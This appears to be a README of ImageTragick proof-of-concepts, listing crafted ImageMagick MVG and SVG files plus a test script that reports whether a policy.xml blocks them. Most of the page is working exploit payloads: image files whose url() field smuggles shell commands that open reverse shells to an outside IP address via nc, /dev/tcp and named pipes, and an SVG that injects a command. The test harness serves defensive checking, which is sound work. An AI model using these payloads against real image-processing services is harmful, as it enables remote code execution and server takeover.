# ImageTragick POCs

## RCE_POC

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|mknod /tmp/backpipe p && nc 121.42.56.8 8989 0</tmp/backpipe | /bin/bash 1>/tmp/backpipe")'
pop graphic-context
```

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|bash -i >& /dev/tcp/121.42.56.8/8989 0>&1")'
pop graphic-context
```
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/someimage.jpg"|nc -e /bin/sh 127.0.0.1 "4544)'
pop grahic-context

```
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 121.42.56.8 8989 >/tmp/f")'
pop graphic-context
```
### svg
```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="640px" height="480px" version="1.1"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink=
"http://www.w3.org/1999/xlink">
<image xlink:href="https://example.com/image.jpg&quot;|ls &quot;-la"
x="0" y="0" height="640px" width="480px"/>
</svg>
```

## How To Use
```
git clone https://github.com/ImageTragick/PoCs.git
cd PoCs
./test.sh
```

To test a `policy.xml` file place it in the script directory and run `test.sh`.

## Safe Output
```
user@host:~/code/PoCs$ ./test.sh 
testing read
SAFE

testing delete
SAFE

testing http with local port: 38663
SAFE

testing http with nonce: a7DyBeV7
SAFE

testing rce1
SAFE

testing rce2
SAFE

testing MSL
SAFE
```

## Unsafe Output
```
user@host:~/code/PoCs$ ./test.sh 
testing read
UNSAFE

testing delete
UNSAFE

testing http with local port: 44755
UNSAFE

testing http with nonce: a7DvBer2
UNSAFE

testing rce1
UNSAFE

testing rce2
UNSAFE

testing MSL
UNSAFE
```
